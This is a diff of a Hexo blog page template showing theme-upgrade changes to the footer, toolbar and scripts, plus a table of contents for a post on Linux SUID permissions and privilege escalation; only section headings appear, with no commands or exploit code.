+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AFSUID"><span class="nav-text">0x01 什么是SUID</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-SUID"><span class="nav-text">1.1 SUID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-SGID"><span class="nav-text">1.2 SGID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-SBIT"><span class="nav-text">1.3 SBIT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AESUID%E3%80%81SGID%E3%80%81SBIT%E6%9D%83%E9%99%90"><span class="nav-text">1.4 如何设置SUID、SGID、SBIT权限</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%85%B3%E4%BA%8ESUID%E6%8F%90%E6%9D%83"><span class="nav-text">0x02 关于SUID提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B8%B8%E7%94%A8%E4%BA%8ESUID%E6%8F%90%E6%9D%83%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="nav-text">0x03 常用于SUID提权的命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-nmap"><span class="nav-text">3.1 nmap</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-1-nmap-2-02-5-21%E7%89%88%E6%9C%AC"><span class="nav-text">3.1.1 nmap 2.02-5.21版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-2-nmap%E9%AB%98%E7%89%88%E6%9C%AC"><span class="nav-text">3.1.2 nmap高版本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-find"><span class="nav-text">3.2 find</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-vi-x2F-vim"><span class="nav-text">3.3 vi&#x2F;vim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-bash"><span class="nav-text">3.4 bash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-cp"><span class="nav-text">3.5 cp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-6-mv"><span class="nav-text">3.6 mv</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-7-nano"><span class="nav-text">3.7 nano</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-8-wget"><span class="nav-text">3.8 wget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-9-%E5%85%B6%E4%BB%96%E6%B5%8B%E8%AF%95%E6%9C%AA%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="nav-text">3.9 其他测试未提权成功的命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-9-1-less"><span class="nav-text">3.9.1 less</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-9-2-more"><span class="nav-text">3.9.2 more</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-9-3-awk"><span class="nav-text">3.9.3 awk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-9-4-man"><span class="nav-text">3.9.4 man</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-9-5-python-x2F-perl-x2F-ruby-x2F-lua-x2F-php-x2F-etc"><span class="nav-text">3.9.5 python&#x2F;perl&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%A6%82%E4%BD%95%E7%BC%93%E8%A7%A3"><span class="nav-text">0x04 如何缓解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol>
+    </div>
 </div>
 
             </div>
@@ -424,19 +493,25 @@
         </div>
 
         <div class="page-main-content-bottom">
-            <footer class="footer">
+            
+<footer class="footer">
     <div class="info-container">
         <div class="copyright-info info-item">
             &copy;
             
-            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">p0melo</a>
+                <span>2020</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">p0melo</a>
+            
         </div>
         
-		<!--
         <div class="theme-info info-item">
-            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
         </div>
-		-->
+        
         
     </div>
 </footer>
@@ -450,15 +525,16 @@
     <ul class="tools-list">
         <!-- TOC aside toggle -->
         
-            <li class="tools-item page-aside-toggle">
-                <i class="fas fa-outdent"></i>
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
             </li>
         
 
         <!-- go comment -->
         
-            <li class="go-comment">
+            <li class="tools-item flex-center go-to-comments">
                 <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
             </li>
         
     </ul>
@@ -476,10 +552,6 @@
 
         <li class="tools-item tool-font-adjust-minus flex-center">
             <i class="fas fa-search-minus"></i>
-        </li>
-
-        <li class="tools-item tool-expand-width flex-center">
-            <i class="fas fa-arrows-alt-h"></i>
         </li>
 
         <li class="tools-item tool-dark-light-toggle flex-center">
@@ -510,18 +582,8 @@
 
     </div>
 
-    
-        <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AFSUID"><span class="nav-text">0x01 什么是SUID</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-SUID"><span class="nav-text">1.1 SUID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-SGID"><span class="nav-text">1.2 SGID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-SBIT"><span class="nav-text">1.3 SBIT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AESUID%E3%80%81SGID%E3%80%81SBIT%E6%9D%83%E9%99%90"><span class="nav-text">1.4 如何设置SUID、SGID、SBIT权限</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%85%B3%E4%BA%8ESUID%E6%8F%90%E6%9D%83"><span class="nav-text">0x02 关于SUID提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B8%B8%E7%94%A8%E4%BA%8ESUID%E6%8F%90%E6%9D%83%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="nav-text">0x03 常用于SUID提权的命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-nmap"><span class="nav-text">3.1 nmap</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-1-nmap-2-02-5-21%E7%89%88%E6%9C%AC"><span class="nav-text">3.1.1 nmap 2.02-5.21版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-2-nmap%E9%AB%98%E7%89%88%E6%9C%AC"><span class="nav-text">3.1.2 nmap高版本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-find"><span class="nav-text">3.2 find</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-vi-vim"><span class="nav-text">3.3 vi&#x2F;vim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-bash"><span class="nav-text">3.4 bash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-cp"><span class="nav-text">3.5 cp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-6-mv"><span class="nav-text">3.6 mv</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-7-nano"><span class="nav-text">3.7 nano</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-8-wget"><span class="nav-text">3.8 wget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-9-%E5%85%B6%E4%BB%96%E6%B5%8B%E8%AF%95%E6%9C%AA%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="nav-text">3.9 其他测试未提权成功的命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-9-1-less"><span class="nav-text">3.9.1 less</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-9-2-more"><span class="nav-text">3.9.2 more</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-9-3-awk"><span class="nav-text">3.9.3 awk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-9-4-man"><span class="nav-text">3.9.4 man</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-9-5-python-perl-ruby-lua-php-etc"><span class="nav-text">3.9.5 python&#x2F;perl&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%A6%82%E4%BD%95%E7%BC%93%E8%A7%A3"><span class="nav-text">0x04 如何缓解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol>
-    </div>
-</div>
-        </aside>
-    
-
-    <div class="image-viewer-container">
-    <img src="">
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
 
 
@@ -542,7 +604,7 @@
                        class="search-input"
                 >
             </div>
-            <span class="popup-btn-close">
+            <span class="close-popup-btn">
                 <i class="fas fa-times"></i>
             </span>
         </div>
@@ -573,10 +635,16 @@
 
 
 
+
+
     
 <script src="/js/local-search.js"></script>
 
 
+
+
+    
+<script src="/js/code-block.js"></script>
 
 
 
@@ -585,12 +653,18 @@
 <div class="post-scripts">
     
         
-<script src="/js/left-side-toggle.js"></script>
+<script src="/js/post-helper.js"></script>
 
+        
+            
 <script src="/js/libs/anime.min.js"></script>
 
+        
+        
+            
 <script src="/js/toc.js"></script>
 
+        
     
 </div>
 
